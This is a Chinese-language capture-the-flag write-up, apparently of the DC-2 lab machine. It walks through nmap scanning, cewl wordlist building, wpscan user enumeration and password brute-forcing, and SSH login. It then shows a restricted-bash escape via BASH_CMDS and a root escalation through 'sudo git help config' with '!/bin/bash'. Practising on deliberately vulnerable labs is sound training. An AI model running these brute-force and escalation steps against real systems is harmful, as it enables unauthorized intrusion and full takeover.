# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255114525-9aa5f05f-6da2-46d7-8d80-b3769c742b22.png#averageHue=%2330333d&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=329&id=ubbd7d7aa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=1106&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115369&status=done&style=none&taskId=uce82a46b-73b5-461c-b94a-24fefca6772&title=&width=1106)
nmap -p- -A 192.168.31.144
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256252734-d004b7c8-f744-4ea9-b0ea-a6ba9cf84efc.png#averageHue=%232d313c&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=352&id=u3293de44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=352&originWidth=1154&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116890&status=done&style=none&taskId=uf51187f6-6baa-45cc-a59d-f671e8ddd82&title=&width=1154)
7744 端口是 ssh
# web 突破
访问 80 端口，主页有个提示
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255307268-8c8dd305-caee-4a59-b445-4304d97e93ea.png#averageHue=%23dcdbda&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=802&id=u3fd30245&margin=%5Bobject%20Object%5D&name=image.png&originHeight=802&originWidth=1702&originalType=binary&ratio=1&rotation=0&showTitle=false&size=285571&status=done&style=none&taskId=udedb32de-94db-44f1-a602-2a342b16376&title=&width=1702)
提示说 cewl 生成密码本，上面也写了 wordpress （url 用 http://dc-2，用 http://192.168.31.144 的话生成的密码本是空的）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255664286-5d96b412-5e55-424c-b5fd-2561ef8d4508.png#averageHue=%2330343f&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=98&id=uc44763b2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=98&originWidth=781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21984&status=done&style=none&taskId=u3111c50a-a2dc-4308-8f2a-20f570444e1&title=&width=781)
wordpress 可以使用 wpscan 来爆破用户名   wpscan --url http://dc-2 --enumerate u  
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255474370-27c94f88-0c0f-4375-a4e3-9325abde9c02.png#averageHue=%2330333d&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=448&id=u45789031&margin=%5Bobject%20Object%5D&name=image.png&originHeight=448&originWidth=1450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111870&status=done&style=none&taskId=u6ec94bc1-0a8b-4d60-9455-349f1be8483&title=&width=1450)
爆出三个用户名 admin、jerry、tom
将这三个用户名加入到刚刚的密码本中
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255636635-bd23235e-53b1-44b2-b1ef-ccde7992f595.png#averageHue=%23242730&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=182&id=u78a7f4b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26033&status=done&style=none&taskId=u8259b4b3-bf83-4847-98ee-6b4edb67593&title=&width=644)
使用 wpscan 对靶机进行密码爆破
wpscan --ignore-main-redirect --url http://dc-2 -U 2.txt -P 1.txt --force
_2.txt 是单独的用户名密码本_
爆破成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255911362-787db9e4-6e4a-4f92-a987-dc5501d04d4d.png#averageHue=%23323642&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=104&id=u09eb2493&margin=%5Bobject%20Object%5D&name=image.png&originHeight=104&originWidth=434&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10633&status=done&style=none&taskId=uefffd171-7f12-4a4b-8755-b8b76dda4b8&title=&width=434)
尝试 ssh 连接
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668255988306-f5c8485e-7256-4c1e-b9f4-463cb99a314d.png#averageHue=%2330343f&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=316&id=u34316664&margin=%5Bobject%20Object%5D&name=image.png&originHeight=316&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93797&status=done&style=none&taskId=u253e6572-76d9-4b65-a7b7-d5d243ebce9&title=&width=974)
输入命令都找不到
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256304773-3924b468-c5d3-4553-aabf-eec53eb4a845.png#averageHue=%2330343f&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=120&id=u821a52e7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=120&originWidth=497&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17363&status=done&style=none&taskId=u3a9a5988-12c8-4a94-9fc2-248daeabdc5&title=&width=497)

# 提权
绕过 rbash
BASH_CMDS[a]=/bin/sh;a
/bin/bash
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256430568-b9b0be53-6f84-4ddc-a97e-a5ad2c36210d.png#averageHue=%2330333d&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=155&id=u697aa1d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23089&status=done&style=none&taskId=u4bf2d4ce-e755-4f27-8a38-aa414ff9bce&title=&width=598)
cat 也不能用
使用并添加环境变量
export PATH=$PATH:/bin/
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256533531-c50021b4-7be4-42f3-8f1e-94bf1c24a704.png#averageHue=%2331343f&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=81&id=u8b047a11&margin=%5Bobject%20Object%5D&name=image.png&originHeight=81&originWidth=880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17311&status=done&style=none&taskId=ufb1d7eb9-27bb-4909-9e02-b230cc3267c&title=&width=880)
flag3 说 jerry 可能 su 啥的
切换 jerry，密码：adipiscing
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256736484-e8c451da-c152-40e4-855d-a7dedac49552.png#averageHue=%232f323c&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=318&id=u3ee15be4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=318&originWidth=928&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60781&status=done&style=none&taskId=u48a62368-5e8e-428c-ac15-16b41f5c473&title=&width=928)
查看 jerry 的权限 sudo -l
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256856245-8af677e3-6465-4de1-b30b-068fed33388f.png#averageHue=%2330343e&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=143&id=u8a419b9c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=986&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34093&status=done&style=none&taskId=u189010d6-6849-46f3-98df-29cbfc03350&title=&width=986)
可以免密使用 git 命令
git 提权
sudo git help config
在最下面键入 !/bin/bash
完成提权
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668256944713-5e148dfb-b33a-49f9-9a9c-70ccdeecab0d.png#averageHue=%2331343f&clientId=u6a93001b-e849-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=93&id=u73e27e51&margin=%5Bobject%20Object%5D&name=image.png&originHeight=93&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16424&status=done&style=none&taskId=uf1a951eb-3f81-4a9c-b811-824ab48062b&title=&width=530)

